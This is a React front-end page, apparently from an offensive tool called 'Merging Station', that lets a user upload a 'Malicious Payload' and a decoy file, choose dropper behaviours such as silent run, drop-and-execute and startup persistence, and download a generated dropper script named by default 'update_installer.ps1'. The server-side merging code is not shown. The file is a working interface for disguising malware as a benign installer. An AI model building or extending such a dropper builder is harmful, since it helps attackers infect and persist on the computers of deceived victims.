
'use client';

import { useState } from 'react';
import { useForm, Controller } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { useToast } from '@/hooks/use-toast';
import { Loader2, AlertTriangle, Binary, FileCode, Shield, Download, Clipboard, Image as ImageIcon } from 'lucide-react';
import { Progress } from '@/components/ui/progress';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Badge } from '@/components/ui/badge';
import { mergePayloads } from '@/actions/merge-payload-action';

const formSchema = z.object({
  payloadFile: z.any().refine(files => files?.length === 1, "Payload file is required."),
  benignFile: z.any().refine(files => files?.length === 1, "Benign file is required."),
  iconFile: z.any().optional(),
  outputName: z.string().min(1, "Output name is required."),
  dropperBehavior: z.string(),
});

const dropperBehaviors = ['Run Silently', 'Drop & Exec (Temp)', 'Persistence (Startup)'];

export default function MergingStationPage() {
  const [buildLog, setBuildLog] = useState<string[]>([]);
  const [isBuilding, setIsBuilding] = useState(false);
  const [progress, setProgress] = useState(0);
  const [finalOutput, setFinalOutput] = useState<{name: string, content: string} | null>(null);
  const { toast } = useToast();

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      outputName: 'update_installer.ps1',
      dropperBehavior: 'Run Silently',
    },
  });

 const runBuildProcess = async (values: z.infer<typeof formSchema>) => {
    setIsBuilding(true);
    setBuildLog([]);
    setProgress(0);
    setFinalOutput(null);

    const log = (message: string) => {
        setBuildLog(prev => [...prev, message]);
        setProgress(prev => Math.min(prev + 25, 100));
    };

    try {
        log(`Build started for ${values.payloadFile[0].name} + ${values.benignFile[0].name}`);

        const payloadFile = values.payloadFile[0] as File;
        const benignFile = values.benignFile[0] as File;

        const payloadContent = await fileToDataUrl(payloadFile);
        const benignContent = await fileToDataUrl(benignFile);
        
        log('Files encoded. Sending to server for merging...');
        
        const response = await mergePayloads({
            payload: { name: payloadFile.name, content: payloadContent },
            benign: { name: benignFile.name, content: benignContent },
            behavior: values.dropperBehavior as any
        });
        
        if (!response.success || !response.scriptContent) {
            throw new Error(response.error || 'Failed to generate script on the server.');
        }
        
        log('Dropper script generated successfully.');

        setFinalOutput({ name: values.outputName, content: response.scriptContent });
        
        log(`Build complete. Output file: ${values.outputName}`);
        toast({ title: 'Build Successful', description: 'Your dropper script is ready for download.' });

    } catch (e: any) {
      toast({ variant: 'destructive', title: 'Build Failed', description: e.message || 'An unexpected error occurred.' });
      setBuildLog(prev => [...prev, `ERROR: ${e.message}`]);
    } finally {
      setIsBuilding(false);
      setProgress(100);
    }
  };
  
  const fileToDataUrl = (file: File): Promise<string> => {
    return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.onload = () => resolve(reader.result as string);
        reader.onerror = reject;
        reader.readAsDataURL(file);
    });
  }

  const handleDownload = () => {
    if(!finalOutput) return;
    const blob = new Blob([finalOutput.content], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = finalOutput.name;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  return (
    <div className="flex flex-col gap-6">
      <div>
        <h1 className="font-headline text-3xl font-semibold">Merging Station</h1>
        <p className="text-muted-foreground">Craft sophisticated payloads by binding files, injecting icons, and applying evasion techniques.</p>
      </div>
      
      <Form {...form}>
        <form onSubmit={form.handleSubmit(runBuildProcess)}>
          <div className="grid lg:grid-cols-3 gap-6 items-start">
            <div className="lg:col-span-2 grid md:grid-cols-2 gap-6">
              <Card>
                <CardHeader><CardTitle className="text-lg">1. Input Files</CardTitle></CardHeader>
                <CardContent className="space-y-4">
                  <FormField control={form.control} name="payloadFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Malicious Payload (.ps1, .bat, etc)</FormLabel><FormControl><Input type="file" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormMessage /></FormItem>)} />
                  <FormField control={form.control} name="benignFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Benign File (Decoy)</FormLabel><FormControl><Input type="file" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormMessage /></FormItem>)} />
                  <FormField control={form.control} name="iconFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Icon File (.ico, optional)</FormLabel><FormControl><Input type="file" accept=".ico" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormMessage /></FormItem>)} />
                </CardContent>
              </Card>

              <Card>
                <CardHeader><CardTitle className="text-lg">2. Dropper Configuration</CardTitle></CardHeader>
                <CardContent className="space-y-4">
                  <FormField control={form.control} name="outputName" render={({ field }) => (
                    <FormItem><FormLabel>Output File Name</FormLabel><FormControl><Input {...field} /></FormControl><FormMessage /></FormItem>
                  )} />
                  <FormField control={form.control} name="dropperBehavior" render={({ field }) => (
                        <FormItem><FormLabel>Dropper Behavior</FormLabel><Select onValueChange={field.onChange} defaultValue={field.value}><FormControl><SelectTrigger><SelectValue /></SelectTrigger></FormControl><SelectContent>{dropperBehaviors.map(b=><SelectItem key={b} value={b}>{b}</SelectItem>)}</SelectContent></Select></FormItem>
                  )} />
                </CardContent>
              </Card>

            </div>

            <div className="lg:col-span-1 space-y-6">
                <Button type="submit" className="w-full text-lg py-6" disabled={isBuilding}>
                    {isBuilding ? <Loader2 className="mr-2 h-5 w-5 animate-spin" /> : <Binary className="mr-2 h-5 w-5" />}
                    Build Payload
                </Button>

                <Card>
                    <CardHeader><CardTitle className="text-lg">Build Log</CardTitle></CardHeader>
                    <CardContent>
                        <Progress value={progress} className="mb-2 h-2" />
                        <div className="h-96 bg-primary/10 p-2 rounded-md font-mono text-xs overflow-y-auto">
                          {buildLog.map((log, i) => <p key={i} className="animate-in fade-in">{`> ${log}`}</p>)}
                        </div>
                    </CardContent>
                    {finalOutput && (
                      <CardFooter className="flex-col items-start gap-4 border-t pt-4">
                          <div className="flex justify-between w-full items-center">
                              <p className="font-semibold flex items-center gap-2"><FileCode className="h-4 w-4"/>Output:</p>
                              <p className="font-mono text-xs">{finalOutput.name}</p>
                          </div>
                          <Button onClick={handleDownload} className="w-full"><Download className="mr-2 h-4 w-4"/>Download Dropper Script</Button>
                      </CardFooter>
                    )}
                </Card>
            </div>
          </div>
        </form>
      </Form>
    </div>
  );
}
